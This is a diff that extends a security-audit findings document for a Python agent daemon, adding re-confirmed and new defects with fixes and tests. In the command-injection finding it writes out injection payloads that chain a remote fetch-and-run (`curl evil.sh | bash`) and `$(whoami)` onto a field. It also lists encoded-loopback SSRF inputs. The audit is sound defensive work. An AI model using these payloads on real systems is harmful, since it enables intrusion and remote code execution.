@@ -474,6 +474,18 @@ fetch.
 
 **Tests:** a `FlipResolver` public→metadata rejected.
 
+**Re-confirmed (Round-12, 2026-07-10)**, with exact current citations:
+`web.py:17` imports only `is_url_blocked` (never `resolved_host_is_blocked`,
+`security/ssrf.py:173-234`); `web.py:121` is the sole guard call; `web.py:152`
+`opener.open(req, ...)` performs the connecting DNS resolution with no
+re-check against the already-vetted result — confirms the gap end-to-end,
+including that no TTL-flip timing is even required (an ordinary A record
+pointing at an internal IP suffices). No new defect surfaced on the rebind
+finding itself; see H-SSRF-NUMERIC-IP (Round-12, below) for a distinct,
+newly-identified sibling gap in the same `host_is_blocked` primitive
+(non-dotted-decimal/octal/hex IP literal encodings), surfaced during this
+re-audit.
+
 ### H-MCP-ARGCAP (MED, CONFIRMED) — tool-call args decoded with no size cap
 
 **Defect:** `execution/tool_loop.py:243-255` `json.loads` of model tool-call
@@ -973,6 +985,24 @@ of snapshotting at construction.
 deployment (regression guard against the same construction-order class
 recurring a 3rd/4th time).
 
+**Re-confirmed (Round-13, 2026-07-10)**, with exact current citations:
+`daemon.py:1658-1741` remains the `EventLoop(...)` constructor span;
+`infra_tracker=getattr(app.state, "_infra_tracker", None)` is at line 1736
+and `deployment_manager=getattr(app.state, "_deployment_manager", None)` at
+line 1733 (both unchanged); `app.state._infra_tracker` is still assigned only
+later at `daemon.py:1832-1833`; a repo-wide check confirms
+`app.state._deployment_manager` is STILL never assigned anywhere in
+`daemon.py` — only lazily in `routers/compute.py:74-78` (assignment at
+`:78`). `loop.py:330`/`:343` store the two permanent `None` snapshots; the
+dead-code branches are `loop.py:3595-3604` (GPU-seconds recording) and
+`loop.py:3610-3612` (`deployment_manager.destroy()`), with related
+idle-teardown bookkeeping at `loop.py:3619-3621` that still runs
+unconditionally regardless of whether `destroy()` fired. No new defect
+surfaced on this pair; confidence raised to independently-reconfirmed. See
+H-ADAPTIVE-ROUTER-NULL (Round-13, below) for a THIRD instance of this exact
+construction-order bug class, found this round in the same
+`_get_or_create_extended_subsystems`/`EventLoop` startup path.
+
 ### H-RELOAD-CONCURRENT (MEDIUM, ties to C-RELOAD) — concurrent `/admin/reload` calls race on shared registries with no lock
 
 **Defect:** `POST /admin/reload` (`routers/reload.py:74-103`) builds a
@@ -1200,6 +1230,15 @@ the others and clears the map; a `terminate()`-time
 `ProcessLookupError` (simulated TOCTOU) is swallowed like the `kill()`
 branch's existing handling.
 
+**Re-confirmed (Round-12, 2026-07-10):** independently re-audited against
+current line numbers — `client.py:108-111` loop and `transport.py:471-473`
+unguarded `terminate()` are unchanged; `daemon.py:2103-2108`'s shutdown
+`stop_all()` call is wrapped in a blanket `except Exception` that only logs,
+so it does not compensate for the missing per-transport isolation. No new
+defect surfaced; confidence raised from single-pass CONFIRMED to
+independently-reconfirmed. See H-MCP-STARTUP-ORPHAN (Round-12, below) for the
+related but distinct startup-side orphan gap this doesn't cover.
+
 ### H-MCP-UVX-UNPINNED (MED, CONFIRMED) — uvx package specs are exempt from the version-pin requirement other launchers enforce
 
 **Defect:** `mcp/transport.py:147-231` `_validate_package_spec` requires a
@@ -1220,6 +1259,16 @@ this is only reachable via a hand-authored config, not the shipped catalog.
 **Tests:** an unpinned `uvx` spec is rejected; a pinned `uvx pkg@x.y.z` (or
 `--from pkg==x.y.z`) spec is still accepted (regression guard on the
 legitimate path).
+
+**Re-confirmed (Round-12, 2026-07-10):** independently re-audited —
+`transport.py:36` `_UVX_FAMILY_LAUNCHERS` is still unioned into
+`_REMOTE_FETCH_LAUNCHERS` (:38, shell-metacharacter check only) but the pin
+check at `_check_spec` (:180) still gates on `launcher in
+_NPM_FAMILY_LAUNCHERS` (:34), which excludes `uvx`. Code comment at
+`transport.py:141-144` now explicitly documents the exclusion as
+intentional, which this finding disputes as a live supply-chain gap for any
+hand-authored (non-catalog) `uvx` config. No new defect surfaced; confidence
+raised to independently-reconfirmed.
 
 ## Round-11 additions (2026-07-10 night-3)
 
@@ -1345,3 +1394,409 @@ the production source and the schema boundary.
 schema layer; the existing enum-mapped public route is unaffected
 (regression guard); `_coerce_priority` clamps an out-of-range raw int rather
 than passing it through unchanged.
+
+## Round-12 additions (2026-07-10 night-4)
+
+### H-MCP-STARTUP-ORPHAN (CRITICAL, CONFIRMED) — partial multi-server MCP startup failure orphans already-spawned subprocesses
+
+**Defect:** `daemon.py:1496-1536` constructs `MCPClient` and calls `await
+mcp_client.start_all()` inside a single `try`. `MCPClient.start_all`
+(`mcp/client.py:66-85`) iterates `self._configs.items()` and only adds a
+server's transport to `self._transports` (`client.py:85`) AFTER its
+`transport.start()`/`list_tools()` succeed (:77-78). The inner guard added
+for Finding 6 (`client.py:72-82`) already stops the ONE transport that is
+*currently* failing before re-raising — but every prior server in the same
+`start_all()` call that started successfully is already resident in
+`self._transports` and is untouched by that guard; the exception simply
+propagates out of `start_all()` with those subprocesses still live. At the
+`daemon.py` call site the propagated exception is caught by
+`except ... as _mcp_exc` (:1531), which logs and unconditionally sets
+`mcp_client = None` (:1536) — discarding the only reference to
+`mcp_client._transports`, and with it every subprocess that HAD
+successfully started. `MCPClient.stop_all()` is never invoked on the
+discarded client. Net effect: for any MCP config with 2+ enabled stdio
+servers, if server N (N>1) fails to start, servers 1..N-1's subprocesses
+leak for the remaining life of the daemon process — even the shutdown-time
+`stop_all()` call at `daemon.py:2103-2108` can't reach them, because
+`app.state._mcp_client` (:1537) was already assigned the discarded `None`
+reference before shutdown ever runs. This is the multi-server counterpart to
+the already-fixed single-transport case inside `start_all()` itself
+(`client.py:72-82`); the daemon call site has no equivalent guard.
+
+**Fix:** in the `daemon.py` `except` block (:1531-1536), before setting
+`mcp_client = None`, check `if mcp_client is not None` and
+`await mcp_client.stop_all()` (in its own nested `try/except` so a cleanup
+failure doesn't mask or replace the original startup error/log) to reap any
+transports that did start before discarding the reference. Equivalently —
+and preferable, since it keeps the invariant local to the class rather than
+requiring every caller of `start_all()` to know about partial-failure
+cleanup — have `MCPClient.start_all()` itself catch any exception from the
+per-server loop, call `self.stop_all()` to reap everything started so far,
+then re-raise.
+
+**Tests:** a `start_all()` call with server 1 succeeding (transport tracked,
+`stop()` spied) and server 2 raising during `start()`/`list_tools()`:
+assert server 1's transport received a `stop()` call before/as part of the
+exception propagating, and `self._transports` ends empty rather than
+retaining server 1's orphaned entry; a daemon-level integration variant
+covering the exact `daemon.py:1496-1536` call site — a 2-server config where
+server 2 fails — asserts server 1's subprocess is torn down rather than
+surviving past the `except` block that nulls `mcp_client`.
+
+### H-SSRF-NUMERIC-IP (MEDIUM, PLAUSIBLE) — decimal/octal/hex IP literal encodings bypass `host_is_blocked`
+
+**Status:** surfaced as a sibling gap while re-confirming H-WEBRETRIEVE-REBIND
+(Round-4) / H-CONNECTOR (above) during this pass; not previously recorded in
+this doc as its own finding.
+
+**Defect:** `security/ssrf.py:138-141` `host_is_blocked`'s numeric-literal
+path calls `ipaddress.ip_address(host)` and, on `ValueError`, falls through
+to `return False` (not blocked) — the same fallthrough that (correctly, by
+design) lets ordinary non-IP hostnames through to the name-only blocklist.
+`ipaddress.ip_address` only accepts a canonical dotted-quad (or IPv6) form;
+it rejects a bare decimal integer (e.g. `"2130706433"`, which is
+`127.0.0.1` as a 32-bit int), a leading-zero octal-flavored quad (e.g.
+`"0177.0.0.1"`, rejected by `ipaddress` since the CVE-2021-29921 leading-zero
+fix), and a hex-prefixed form (e.g. `"0x7f000001"`) — all three raise
+`ValueError` in `ip_address()` and are therefore treated as "not an IP,
+must be a hostname" by `host_is_blocked`, i.e. **not blocked**, even though
+each is a well-known alternate encoding of a loopback/internal address.
+Whether this is actually exploitable end-to-end depends on whether the
+downstream resolver/HTTP client (`urllib.request` in `retrieval/web.py`,
+`httpx` in the connector layer) itself accepts and resolves one of these
+non-canonical forms as the literal IP — behavior that varies by platform
+libc/resolver and is not independently verified in this pass, hence
+PLAUSIBLE rather than CONFIRMED-exploitable. `resolved_host_is_blocked`
+(`ssrf.py:173-234`) has the identical fallthrough shape (:207-211) for the
+same reason, so it inherits the same gap for any caller that reaches it with
+one of these encodings.
+
+**Fix:** before falling through to "not an IP" in `host_is_blocked` (and the
+equivalent branch in `resolved_host_is_blocked`), attempt a secondary parse
+of a purely-numeric or `0x`/leading-zero-octal-shaped host as an integer
+(and hex) IPv4 form (e.g. via `ipaddress.IPv4Address(int(host, 0))` guarded
+by a strict regex so it only fires on inputs that look like one of these
+alternate encodings, not on ordinary hostnames that happen to start with a
+digit) and re-run `_ip_addr_is_blocked` on the result; deny if blocked.
+
+**Tests:** `host_is_blocked("2130706433")` (decimal-encoded 127.0.0.1) →
+`True`; `host_is_blocked("0177.0.0.1")` (octal-flavored loopback) → `True`;
+`host_is_blocked("0x7f000001")` (hex-encoded loopback) → `True`; a decimal
+encoding of a public IP is NOT blocked (regression guard against
+over-broadly denying legitimate numeric-looking hosts); ordinary hostnames
+starting with a digit (e.g. `"123movies.example.com"`) are unaffected
+(regression guard against the new parse path misfiring on real hostnames).
+
+## Round-13 additions (2026-07-10)
+
+### H-SIGNING-NO-VERIFY (HIGH, CONFIRMED — nuanced) — self-update and hot-reload apply content with no signature/checksum verification against a trust anchor
+
+**Defect:** the self-update apply path (`routers/self_update.py:67`
+`plan = classify(request)` → `:73`
+`result = apply_plan(plan, request, audit_sink=audit_sink)`, with
+`apply_plan` in `self_update/apply.py:169-371`) and the generic hot-reload
+apply path (`reload/hot_reloader.py::HotReloader.reload()`, lines 92-116,
+covering config/template/playbook/skill reload) both apply local content
+with **no cryptographic signature or checksum verification against a trust
+anchor**. `apply_plan` is gated by an approval-token check (`verify_psk`,
+:208-218), protected-path/capability-lattice refusal (:242-265), a
+`requires_approval` tier gate (:285-293), and for CODE-tier changes a
+mandatory caller-supplied `validate` callback that fails closed if absent
+(:334-353) — so it is not wholly unguarded, but none of those gates is a
+content-hash/signature check, and the CONFIG/YAML tier (the same tier
+exploited by H-SELFMOD-DENYLIST above) has no validate callback at all.
+`HotReloader.reload()`'s generic config/template/playbook/skill path
+(:92-116) has zero verification of any kind. The one code path that DOES
+have an integrity check — `HotReloader.reload_code_module()` (:118-326,
+sha256 compare at :238-248 via `hmac.compare_digest`) — is optional and
+silently skipped whenever the caller omits `expected_sha256`.
+
+Separately, the daemon's cosign keystore (`routers/signing.py:46-153`,
+`secrets/cosign.py`) is confirmed **completely disconnected** from both
+apply paths — it only exposes generate/list/read/delete for cosign keys and
+gitsign config, with zero imports of `cosign`/`signing` under `self_update/`
+or `reload/`. The one signature-verification function that does exist in
+the codebase, `integrity/scanner.py:614` `verify_signature` (exported via
+`integrity/__init__.py`), is wired only into the separate FIM/overlay-guard
+feature (`routers/integrity.py`), not into either apply path.
+
+**Fix:** wire a genuine trust-anchor verification (a cosign signature check
+via the already-built keystore, or at minimum a required, non-optional
+checksum against a pinned/attested value) into `apply_plan`'s CODE and
+CONFIG/YAML tiers before the write, and into `HotReloader.reload()`'s
+generic path; make the existing `reload_code_module` sha256 gate mandatory
+rather than opt-in for any caller reachable from an untrusted-origin
+proposal.
+
+**Tests:** an `apply_plan` call for a CONFIG-tier change with no
+verifiable signature/checksum is refused once the gate lands (currently
+applies); `HotReloader.reload()` refuses unsigned/unverified content once
+wired; `reload_code_module` refuses when `expected_sha256` is omitted for
+any caller path that is supposed to require it (regression guard against
+the optional clause being silently dropped from a caller).
+
+### H-SIGNING-NO-PRIVSEP (MEDIUM, CONFIRMED) — `/admin/signing/*` has no privilege tier beyond the shared PSK
+
+**Defect:** `daemon.py:2826` (`signing.register(app, daemon_state)`)
+registers the signing router in the same flat, unconditional sequence of
+~30 `*.register(app, daemon_state)` calls as every other router — no
+wrapper, no role/scope argument. `routers/signing.py`'s six endpoints —
+cosign generate (:46), list (:68), read (:92), delete (:105), gitsign
+config write (:116), gitsign read (:135) — take no `Depends(...)`/role
+parameter and call no admin-vs-agent check; the only auth applied anywhere
+is the single shared-PSK `auth_and_stats_middleware` (`daemon.py:2468-2504`),
+the same credential injected into every dispatched agent's subprocess env
+(`renderers/runner.py:227-229`). So any PSK holder — including any
+dispatched agent — can mint, list, read, or delete cosign signing keys for
+any project. Currently harmless in practice only because H-SIGNING-NO-VERIFY
+(above) means nothing consults these keys for a trust decision yet; it
+becomes directly exploitable (an agent minting its own trusted signing key)
+the moment that finding is fixed without this one being fixed alongside it.
+
+**Fix:** address together with H-SIGNING-NO-VERIFY — add an operator-only
+capability/role check in front of `/admin/signing/*` (ties to
+H-ADMIN-PSK-ONLY's broader per-endpoint capability-gate fix), so a mere
+agent-tier PSK cannot mint or exfiltrate signing material.
+
+**Tests:** a request carrying an agent-tier PSK is refused on
+`/admin/signing/cosign/generate` and `/delete`, reserved for operator tier;
+an operator-tier credential still succeeds (regression guard).
+
+### H-STREAM-PROCESSOR-CMDI (HIGH, CONFIRMED) — `/admin/stream/dispatch` processor binary/args are shell-injected into a generated script, unsanitized
+
+**Defect:** `stream/__init__.py`'s `_write_shell_processor` (lines 125-144)
+takes `binary = processor.get("binary", kind)` (:129) and
+`extra_args = processor.get("args", "")` (:130) straight from the untyped
+`processor` dict and f-string-interpolates them into a generated `.sh` file
+(`f'exec {binary} {extra_args} "$CHUNK_PATH"'`, :140) that is `chmod
+0o755`'d (:143) and later executed as a script — not passed as an argv
+list to `subprocess.run`. No `shlex.quote`, no escaping, no character
+allowlist. Source: `routers/stream.py`'s `StreamDispatchRequest.processor`
+field (:45, `dict[str, object] | None`) has **no** `field_validator` —
+unlike the `role` field, which has `_validate_role_name`/`_ROLE_NAME_RE`
+(:50-55). The only check on `processor` is a `tool` key allowlist against
+`SUPPORTED_PROCESSOR_TOOLS` (:116-125); `binary`/`args` are never
+inspected. Flow: `cloner.materialize_processor(clone_path,
+processor=dict(req.processor))` (:132) → `stream/__init__.py:104`
+`materialize_processor` → for `tool in {"whisper.cpp","ffmpeg"}` dispatches
+to `_write_shell_processor` (:125), reaching the sink. A value like
+`binary="ffmpeg; curl evil.sh | bash #"` or `args="$(whoami)"` is
+interpreted by bash at execution time — classic shell-metacharacter command
+injection via string-formatting into a script file. PSK-gated (same
+surface as the already-fixed H-STREAM-TRAVERSAL role-traversal bug in this
+same file), but any PSK holder can trigger it — a genuinely distinct
+defect from the role-traversal one (different field, different sink,
+injection not traversal).
+
+**Fix:** validate/allowlist `binary` against a small known-tool set
+(mirroring `SUPPORTED_PROCESSOR_TOOLS`), and pass `args` as a `list[str]`
+argv (constructed via `shlex.split` + a character/pattern allowlist, or
+rejected outright if it contains shell metacharacters) rather than
+interpolating a raw string into a shell script; alternatively invoke the
+processor directly via `subprocess.run([binary, *args, chunk_path])` and
+drop the generated-`.sh`-file indirection entirely.
+
+**Tests:** a `processor={"binary": "ffmpeg; touch /tmp/pwned"}` (or an
+`args` value containing `;`/`|`/`` ` ``/`$()`) is rejected before the
+script is written/executed; a legitimate `ffmpeg`/`whisper.cpp` processor
+with ordinary args still materializes and runs correctly (regression
+guard).
+
+### H-CONNECTOR-EXC-LEAK (MEDIUM, CONFIRMED) — connectors return raw exception text to callers, breaking the documented generic-marker pattern
+
+**Defect:** the codebase has a documented safe pattern in
+`redis_stats.py:180-195` (`health()`): log full exception detail via
+`logger.warning(..., exc_info=True)`, return a **generic marker** string
+(`"executor init failed"`/`"probe failed"`) — explicitly to avoid leaking
+internal hostnames/topology/credentials embedded in driver errors. Several
+other connectors break this pattern by returning raw `str(exc)`/f-string-
+embedded exception text directly in a normalized health/query record:
+`connectors/redfish.py:201` (`f"unreachable: {exc}"`), `:237`
+(`message=f"query error in {fn.__name__}: {exc}"`), `:240`
+(`raw={"error": str(exc)}`); `connectors/signoz.py:261` (`"error":
+str(exc)`); `connectors/jenkins.py:170` (`"error": str(exc)`);
+`connectors/aws_observability.py:240` (`f"boto3 unavailable: {exc}"`),
+`:242` (`"detail": str(exc)`). A broader sweep this round found more
+instances of the same anti-pattern: `connectors/containerd.py:347`
+(`raw={"path": str(path), "error": str(exc)}`),
+`connectors/local_files.py:150,279` (`JsonlLogSource.health()`/
+`SyslogGrepSource.health()`, both `"error": str(exc)`),
+`connectors/windows_event_log.py:117,432,461` (subprocess stderr text
+flows unfiltered into the query error record and `health()` detail),
+`connectors/mac_unified_log.py:84,220,223` (same subprocess-error-as-tuple
+shape, `f"probe raised: {exc!r}"` at :223), `connectors/kubernetes.py:348,350`
+(`self._error(str(exc))` / `self._error(f"query failed: {exc}")`). Both
+reachable endpoints pass connector output straight through with no
+sanitization: `/admin/connectors/health` (`daemon.py:2946`,
+`await asyncio.to_thread(reg.health_all)` returned verbatim) and
+`/api/observe/health`/`/api/observe/query` (`routers/observe.py:114,125`).
+No new instances found in `okta.py`, `nomad.py`, `cilium_hubble.py`,
+`docker_engine.py`, `podman.py`, `azure_resource_graph.py`,
+`elastic_apm.py`, `pyroscope.py`, or `openshift.py`. See
+H-GATEWAY-EXC-CREDLEAK (below) for a related but more severe HIGH sibling
+in the model-provider gateway, where the leaked exception text can be
+credential-bearing.
+
+**Fix:** apply the `redis_stats.py` generic-marker pattern (log full
+detail, return a static/generic `detail`/`error` string) to every cited
+sink above.
+
+**Tests:** each connector's `health()`/`query()` error path returns a
+generic marker (not the raw exception text) while the full detail still
+reaches the logger with `exc_info=True`; a parametrized regression test
+across the ~11 cited call sites.
+
+### H-WEBHOOK-DELIVERY-REBIND (MEDIUM, CONFIRMED) — registered webhooks are SSRF-checked only at registration, never re-checked at delivery
+
+**Defect:** `events/hooks.py::register_webhook` (:130-159) SSRF-checks the
+URL exactly once, at registration time, via `_ensure_safe_webhook_url`
+(:24-37, calling `is_url_blocked` at :33) before persisting it into
+`WebhookConfig`/`HookRegistration` (:145-157). `fire()` (:167-207) and the
+delivery helpers `_fire_webhook`/`_do_post_async` (:233-301/:241-273)
+never call `is_url_blocked`, `resolved_host_is_blocked`, or
+`resolve_and_pin` again — the delivery path posts directly to the URL
+stored at registration time. `follow_redirects=False` is set on the
+delivery request (:260, with a comment acknowledging redirect-based
+bypass), but that only blocks a 30x-based bypass, not a DNS A-record
+change between registration and a later `fire()` call: a long-lived
+webhook registration whose hostname is later repointed (DNS rebind) to
+`169.254.169.254`/RFC1918/loopback is never caught, because the only guard
+ever runs once, at registration. This is a distinct sink from the
+already-documented H-WEBRETRIEVE-REBIND (`retrieval/web.py::fetch_web_page`)
+and H-CONNECTOR (`connectors/nomad.py`/`cilium_hubble.py`) — a different
+module/class with no shared functions beyond the common `is_url_blocked`
+import.
+
+**Fix:** add a bounded re-check at delivery time — either
+`resolved_host_is_blocked` (or the planned
+`security/ssrf.py::resolve_and_pin`) called immediately before
+`_do_post_async`'s connect, or pin the vetted IP from registration time and
+connect via that IP with an explicit `Host:` header (mirroring the fix
+pattern already proposed for H-CONNECTOR/H-WEBRETRIEVE-REBIND).
+
+**Tests:** a webhook registered against a public IP, then DNS-rebound to
+`169.254.169.254` before `fire()`, is refused at delivery time rather than
+posted; a legitimate, stable-DNS webhook still fires successfully
+(regression guard).
+
+### H-GATEWAY-SCOPE-FAILOPEN (LOW, CONFIRMED) — project-secrets-resolver failure falls back to the shared/base resolver; SSRF errors disclose internal URLs
+
+**Defect:** `src/general_ludd/models/gateway.py::_resolver_for_project`
+(:729-764) catches **any** exception from `for_project(project_id)` —
+including a malformed-id `ValueError`, which the function's own docstring
+(:746-748) acknowledges — and falls back to `self._secrets` (the
+shared/unscoped base resolver) at :758-764, silently dropping per-project
+secret-resolver scoping for that call. Not a full cross-project leak
+(`base` only reaches shared/base aliases, not another project's
+`projects/<id>/<alias>` scoped secrets), but it is a fail-open on the
+scoping decision itself: an error condition that should probably deny or
+surface loudly instead quietly widens to the shared credential set.
+Separately, two `SSRFRejectionError` sites in the same file —
+`gateway.py:511-514` and `:833-836` — interpolate the resolved `api_base`
+URL (via `!r`) directly into the exception message (`f"SSRF guard:
+refusing blocked api_base_alias URL {base_url!r} for profile
+'{profile_id}'"`), an internal-endpoint info-disclosure concern if that
+message ever reaches a caller outside the trust boundary.
+
+**Fix:** narrow the `except Exception` in `_resolver_for_project` to the
+specific expected failure modes (e.g. `ValueError` from a malformed id) and
+fail closed (raise or return `None` rather than silently falling back to
+the shared resolver) for anything else; redact or genericize the
+`base_url` in both `SSRFRejectionError` messages before they can propagate
+to an external caller.
+
+**Tests:** a malformed `project_id` passed to `_resolver_for_project` is
+denied/raises rather than silently resolving against the shared base; a
+blocked `api_base_alias` SSRF rejection no longer echoes the raw internal
+URL in its message (or is only logged, not returned to the caller).
+
+### H-ADAPTIVE-ROUTER-NULL (HIGH, CONFIRMED) — third instance of the construction-order null-dependency bug class: `_adaptive_router`'s guard omits the `is None` clause every sibling has
+
+**Defect:** same root-cause cluster as H-STARTUP-NULL-DEPS (Round-8,
+re-confirmed above). `daemon.py::_get_or_create_extended_subsystems`
+(:2221-2320) guards `_adaptive_router` construction at :2260-2261 with
+**only** `not hasattr(app.state, "_adaptive_router")` — missing the
+`or app.state._adaptive_router is None` clause that every sibling branch in
+the same function has (`_project_manager` :2237, `_utilization_tracker`
+:2240, `_model_registry` :2242, `_skill_registry` :2244, all
+`not hasattr(...) or app.state.X is None`). Because `create_daemon_app`
+pre-seeds `app.state._adaptive_router = None` at :2374 (alongside the four
+siblings at :2370-2373), `hasattr(app.state, "_adaptive_router")` is
+`True` from app-creation onward — so the real-construction `if` branch
+(:2261-2306, building an `AdaptiveRouter` with `health_tracker`/
+`quantization_map`/Pareto routing/cross-project borrowing) **never
+executes**; only the `elif` at :2307-2308 fires, re-reading the pre-seeded
+`None`. This flows into `EventLoop(adaptive_router=ext["adaptive_router"],
+...)` at :1708 and `ReturnReviewer(router=ext.get("adaptive_router"), ...)`
+at :1358-1361 — both permanently `None` in production, so Pareto-based
+adaptive model/prompt routing and cross-project borrowing are dead code,
+identical in shape to the `infra_tracker`/`deployment_manager` bug above
+(this file's CA-T7/CA-T8/CA-T9/H3 comments already document 3 prior fixes
+of this exact bug class; this is a 4th unfixed instance alongside
+`infra_tracker`/`deployment_manager`).
+
+**Fix:** add the missing `or app.state._adaptive_router is None` clause to
+the :2260-2261 guard, matching the four sibling branches exactly.
+
+**Tests:** after `_get_or_create_extended_subsystems` runs against a
+freshly-created `app` (where `_adaptive_router` is pre-seeded `None`), the
+returned `ext["adaptive_router"]` is a live `AdaptiveRouter` instance, not
+`None`; `EventLoop.adaptive_router` and `ReturnReviewer.router` are
+asserted non-`None` after daemon startup (regression guard against this
+construction-order class recurring again, mirroring the CA-T7/8/9
+regression tests already in the suite).
+
+### H-GATEWAY-EXC-CREDLEAK (HIGH, CONFIRMED) — raw provider-exception text (potentially credential-bearing) flows unredacted into an admin-visible facet and on-disk replay records
+
+**Defect:** the codebase already has a redaction helper —
+`secrets/manager.py::_sanitize_error`/`_redact` (:214-240, regex +
+known-value substitution, tested by
+`tests/unit/test_secrets_log_sanitization.py`) — but it is **never
+imported anywhere under `src/general_ludd/models/`** (checked all 18 files
+in that package). This matters because `models/timeout_detector.py`
+classifies 401/403 provider responses as `AUTH_ERROR`
+(`_AUTH_ERROR_CODES = {401, 403}` at :56; checked at :168-169 and
+:192-193) — exactly the "invalid API key" class of error that can embed
+the key itself in provider error text. Two unredacted sinks:
+- `models/gateway.py:931` `record_model_call(error=str(exc))` →
+  `metrics/collector.py:227-232` stores the raw string in a
+  `_recent_failures` ring buffer → `controllers/environment_advisor.py:
+  526-541` surfaces up to 3 raw failure strings as `"recent_failures"` →
+  `routers/environment.py:753` `GET /api/environment` returns them
+  (PSK-gated per `daemon.py`'s `_PUBLIC_PATHS`, but any PSK holder can read
+  it).
+- `daemon.py:1913-1919` — a `_gateway_executor except Exception` block
+  returns `f"Error: {exc}"` as the task's **successful** output (not an
+  error status) → `agents/dispatcher.py:211-232`
+  (`status="completed", output=output`) → `replay/recorder.py:23-27`
+  persists it **unredacted** to disk at
+  `.gludd/replays/runs/<run_id>/events/<seq>.json` →
+  `daemon_wiring.py:155-156` (`return result.output or ""`) feeds it back
+  to the invoking agent.
+- Log-only (lower severity, generic `HTTPException` returned to the
+  caller): `routers/models.py:592,744` and `models/failover.py:38-46` (the
+  latter also retains events in-memory via `get_failover_events()`, not
+  just logs).
+- Confirmed correct, for contrast: `gateway.py:904-909` logs a **literal**
+  `api_key=***REDACTED***` string, never the real key.
+
+Verified-safe, not flagged: key-sourcing allowlist (`secrets/env.py:22-93`),
+cross-project secret scoping (`secrets/project_secrets.py:20-64`),
+cross-provider failover re-resolving its own alias rather than borrowing
+another's (`gateway.py:1412-1536`), and the project-scoped response cache
+(`response_cache.py:21-38`).
+
+**Fix:** promote `SecretsManager._redact`'s known-value+regex approach to
+a shared, reusable util (e.g. `security/redact.py`) and route every
+`str(exc)` at the sinks above — `gateway.py:931`, `daemon.py:1919`, and the
+log-only `routers/models.py:592,744`/`failover.py:38-46` sites — through it
+before log/persist/return.
+
+**Tests:** an `AUTH_ERROR`-classified provider exception whose text
+contains a fake API-key-shaped string does not appear verbatim in
+`GET /api/environment`'s `recent_failures`, in a replay JSON file under
+`.gludd/replays/`, or in the task output returned to the invoking agent —
+in each case the redacted/generic form appears instead; the existing
+`test_secrets_log_sanitization.py` behavior is unchanged (regression guard
+that the promoted-to-shared helper doesn't alter `SecretsManager`'s own
+redaction).
